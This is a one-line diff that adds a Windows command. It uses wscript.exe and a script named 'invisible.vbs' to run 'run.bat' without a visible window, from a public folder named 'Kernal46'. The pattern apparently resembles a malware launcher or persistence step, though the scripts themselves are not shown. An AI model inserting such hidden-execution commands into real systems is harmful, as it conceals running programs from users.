@@ -1,0 +1,1 @@
+wscript.exe C:\Users\Public\Kernal46\PythonBased\invisible.vbs C:\Users\Public\Kernal46\PythonBased\run.bat
